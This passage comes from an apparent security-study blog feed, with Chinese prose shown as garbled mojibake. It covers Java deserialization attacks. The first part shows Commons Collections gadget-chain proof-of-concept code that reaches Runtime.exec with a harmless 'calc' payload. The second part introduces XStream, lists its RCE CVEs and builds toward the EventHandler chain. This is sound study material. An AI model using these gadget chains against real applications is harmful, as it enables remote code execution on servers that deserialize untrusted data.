class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(rmiConnector);</span><br><span class="line">        Map&lt;Object, Object&gt; outmap = TransformedMap.decorate(map, <span class="literal">null</span>,invokerTransformer);</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outoutmap</span> <span class="operator">=</span> TransformedMap.decorate(outmap,<span class="literal">null</span>,constantTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">test</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct=test.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class,outoutmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(obj);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.functors.ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazyMapClass</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WrapperConnectionPoolDataSourceé“¾"><a href="#WrapperConnectionPoolDataSourceé“¾" class="headerlink" title="WrapperConnectionPoolDataSourceé“¾"></a>WrapperConnectionPoolDataSourceé“¾</h2><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/gn8pc9n3hhcvwiit">C3P0é“¾</a>å‚è€ƒè¿™ä¸ªæ–‡ç« è‡ªå·±è®°å½•è¿‡äº†ä½†æ˜¯åˆå¿˜è®°äº†å“ˆå“ˆå“ˆ</p><p>åˆ—å‚è€ƒè‡ªä»¥ä¸‹å¸ˆå‚…ä»¬çš„æ–‡ç« </p><p><a href="https://tttang.com/archive/1701/#toc_wrapperconnectionpooldatasource">https://tttang.com/archive/1701/#toc_wrapperconnectionpooldatasource</a></p><p><a href="https://www.cnblogs.com/F12-blog/p/18127214">https://www.cnblogs.com/F12-blog/p/18127214</a></p><p><a href="https://asal1n.github.io/2024/03/03/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://asal1n.github.io/2024/03/03/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://www.aiwin.fun/index.php/archives/4388/#cl-3">https://www.aiwin.fun/index.php/archives/4388/#cl-3</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xstreamååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>XStreamæ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºJavaåº“ï¼ŒJavaå¯¹è±¡åºåˆ—åŒ–åˆ°XMLï¼Œåä¹‹äº¦ç„¶(å³ï¼šå¯ä»¥è½»æ˜“çš„å°†Javaå¯¹è±¡å’Œxmlæ–‡æ¡£ç›¸äº’è½¬æ¢)ã€‚</p><p>Xstreamå…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹</p><ul><li>ä½¿ç”¨æ–¹ä¾¿ - XStreamçš„APIæä¾›äº†ä¸€ä¸ªé«˜å±‚æ¬¡å¤–è§‚ï¼Œä»¥ç®€åŒ–å¸¸ç”¨çš„ç”¨ä¾‹ã€‚</li><li>æ— éœ€åˆ›å»ºæ˜ å°„ - XStreamçš„APIæä¾›äº†é»˜è®¤çš„æ˜ å°„å¤§éƒ¨åˆ†å¯¹è±¡åºåˆ—åŒ–ã€‚</li><li>æ€§èƒ½ - XStreamå¿«é€Ÿå’Œä½å†…å­˜å ç”¨ï¼Œé€‚åˆäºå¤§å¯¹è±¡å›¾æˆ–ç³»ç»Ÿã€‚</li><li>å¹²å‡€çš„XML - XStreamåˆ›å»ºä¸€ä¸ªå¹²å‡€å’Œç´§å‡‘XMLç»“æœï¼Œè¿™å¾ˆå®¹æ˜“é˜…è¯»ã€‚</li><li>ä¸éœ€è¦ä¿®æ”¹å¯¹è±¡ - XStreamå¯åºåˆ—åŒ–çš„å†…éƒ¨å­—æ®µï¼Œå¦‚ç§æœ‰å’Œæœ€ç»ˆå­—æ®µï¼Œæ”¯æŒéå…¬æœ‰åˆ¶å’Œå†…éƒ¨ç±»ã€‚é»˜è®¤æ„é€ å‡½æ•°ä¸æ˜¯å¼ºåˆ¶æ€§çš„è¦æ±‚ã€‚</li><li>å®Œæ•´å¯¹è±¡å›¾æ”¯æŒ - XStreamå…è®¸ä¿æŒåœ¨å¯¹è±¡æ¨¡å‹ä¸­é‡åˆ°çš„é‡å¤å¼•ç”¨ï¼Œå¹¶æ”¯æŒå¾ªç¯å¼•ç”¨ã€‚</li><li>å¯è‡ªå®šä¹‰çš„è½¬æ¢ç­–ç•¥ - å®šåˆ¶ç­–ç•¥å¯ä»¥å…è®¸ç‰¹å®šç±»å‹çš„å®šåˆ¶è¢«è¡¨ç¤ºä¸ºXMLçš„æ³¨å†Œã€‚</li><li>å®‰å…¨æ¡†æ¶ - XStreamæä¾›äº†ä¸€ä¸ªå…¬å¹³æ§åˆ¶æœ‰å…³è§£ç»„çš„ç±»å‹ï¼Œä»¥é˜²æ­¢æ“çºµè¾“å…¥å®‰å…¨é—®é¢˜ã€‚</li><li>é”™è¯¯æ¶ˆæ¯ - å‡ºç°å¼‚å¸¸æ˜¯ç”±äºæ ¼å¼ä¸æ­£ç¡®çš„XMLæ—¶ï¼ŒXStreamæŠ›å‡ºä¸€ä¸ªç»Ÿä¸€çš„ä¾‹å¤–ï¼Œæä¾›äº†è¯¦ç»†çš„è¯Šæ–­ï¼Œä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</li><li>å¦ä¸€ç§è¾“å‡ºæ ¼å¼ - XStreamæ”¯æŒå…¶å®ƒçš„è¾“å‡ºæ ¼å¼ï¼Œå¦‚JSONã€‚</li></ul><h2 id="æ¼æ´æ¡ä»¶"><a href="#æ¼æ´æ¡ä»¶" class="headerlink" title="æ¼æ´æ¡ä»¶"></a>æ¼æ´æ¡ä»¶</h2><table><thead><tr><th>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</th><th>CVE-2013-7285</th><th>XStream &lt;&#x3D; 1.4.6</th></tr></thead><tbody><tr><td>XStream XXE</td><td><a href="https://x-stream.github.io/CVE-2016-3674.html">CVE-2016-3674</a></td><td><code>XStream</code><br/> &lt;&#x3D; 1.4.8</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td>CVE-2019-10173</td><td><code>XStream</code><br/> &lt; 1.4.10</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2020-26217.html">CVE-2020-26217</a></td><td><code>XStream</code><br/> &lt;&#x3D; 1.4.13</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a></td><td><code>XStream</code><br/>: &lt;&#x3D; 1.4.15</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a></td><td><code>XStream</code><br/>: &lt;&#x3D; 1.4.15</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a></td><td><code>XStream</code><br/>: &lt;&#x3D; 1.4.15</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a></td><td><code>XStream</code><br/>&lt;&#x3D; 1.4.15</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a></td><td><code>XStream</code><br/>: &lt;&#x3D; 1.4.15</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a></td><td><code>XStream</code><br/>: &lt;&#x3D; 1.4.15</td></tr><tr><td>XStream è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</td><td><a href="https://x-stream.github.io/CVE-2021-29505.html">CVE-2021-29505</a></td><td><code>XStream</code><br/>: &lt;&#x3D; 1.4.16</td></tr></tbody></table><h2 id="ç¯å¢ƒä¾èµ–"><a href="#ç¯å¢ƒä¾èµ–" class="headerlink" title="ç¯å¢ƒä¾èµ–"></a>ç¯å¢ƒä¾èµ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;xstream&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.4</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="EventHandlerç±»"><a href="#EventHandlerç±»" class="headerlink" title="EventHandlerç±»"></a>EventHandlerç±»</h2><p>EventHandlerç±»æ˜¯å®ç°äº†InvocationHandlerçš„ä¸€ä¸ªç±»ï¼Œè®¾è®¡æœ¬æ„æ˜¯ä¸ºäº¤äº’å·¥å…·æä¾›beansï¼Œå»ºç«‹ä»ç”¨æˆ·ç•Œé¢åˆ°åº”ç”¨ç¨‹åºé€»è¾‘çš„è¿æ¥</p><p>EventHandlerç±»å®šä¹‰çš„ä»£ç å¦‚ä¸‹ï¼Œå…¶å«æœ‰targetå’Œactionå±æ€§ï¼Œåœ¨EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()çš„å‡½æ•°è°ƒç”¨é“¾ä¸­ï¼Œä¼šå°†å‰é¢ä¸¤ä¸ªå±æ€§ä½œä¸ºç±»æ–¹æ³•å’Œå‚æ•°ç»§ç»­åå°„è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String action;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">                <span class="keyword">return</span> invokeInternal(proxy, method, arguments);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">                <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> Statement.getMethod(</span><br><span class="line">                             target.getClass(), action, argTypes);</span><br><span class="line">                ...</span><br><span class="line">                <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Converterè½¬æ¢å™¨"><a href="#Converterè½¬æ¢å™¨" class="headerlink" title="Converterè½¬æ¢å™¨"></a>Converterè½¬æ¢å™¨</h2><p>XStreamä¸ºJavaå¸¸è§çš„ç±»å‹æä¾›äº†Converterè½¬æ¢å™¨ã€‚è½¬æ¢å™¨æ³¨å†Œä¸­å¿ƒæ˜¯XStreamç»„æˆçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p>è½¬æ¢å™¨çš„èŒè´£æ˜¯æä¾›ä¸€ç§ç­–ç•¥ï¼Œç”¨äºå°†å¯¹è±¡å›¾ä¸­æ‰¾åˆ°çš„ç‰¹å®šç±»å‹çš„å¯¹è±¡è½¬æ¢ä¸ºXMLæˆ–å°†XMLè½¬æ¢ä¸ºå¯¹è±¡ã€‚</p><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯è¾“å…¥XMLåå®ƒèƒ½è¯†åˆ«å…¶ä¸­çš„æ ‡ç­¾å­—æ®µå¹¶è½¬æ¢ä¸ºç›¸åº”çš„å¯¹è±¡ï¼Œåä¹‹äº¦ç„¶ã€‚</p><p>è½¬æ¢å™¨éœ€è¦å®ç°3ä¸ªæ–¹æ³•ï¼š</p><ul><li>canConvertæ–¹æ³•ï¼šå‘Šè¯‰XStreamå¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿè½¬æ¢çš„å¯¹è±¡ï¼›</li><li>marshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†å¯¹è±¡è½¬æ¢ä¸ºXMLæ—¶å€™çš„å…·ä½“æ“ä½œï¼›</li><li>unmarshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†XMLè½¬æ¢ä¸ºå¯¹è±¡æ—¶çš„å…·ä½“æ“ä½œï¼›</li></ul><p>å…·ä½“å‚è€ƒï¼š<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h2><p>å…ˆå®šä¹‰ä¸€ä¸ªPersonç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> Company company;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, Company company)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.company = company;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Company <span class="title function_">getCompany</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> company;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCompany</span><span class="params">(Company company)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.company = company;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Read People&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Companyç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Company</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String companyName;</span><br><span class="line">    <span class="keyword">private</span> String companyLocation;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Company</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Company</span><span class="params">(String companyName, String companyLocation)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.companyName = companyName;</span><br><span class="line">        <span class="built_in">this</span>.companyLocation = companyLocation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCompanyName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> companyName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCompanyName</span><span class="params">(String companyName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.companyName = companyName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCompanyLocation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> companyLocation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCompanyLocation</span><span class="params">(String companyLocation)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.companyLocation = companyLocation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;Company&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Xstream_stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;ocean&quot;</span>, <span class="number">19</span>, <span class="keyword">new</span> <span class="title class_">Company</span>(<span class="string">&quot;zzzz&quot;</span>, <span class="string">&quot;shandong&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(person);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.ocean.Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ocean<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>19<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">companyName</span>&gt;</span>zzzz<span class="tag">&lt;/<span class="name">companyName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">companyLocation</span>&gt;</span>shandong<span class="tag">&lt;/<span class="name">companyLocation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 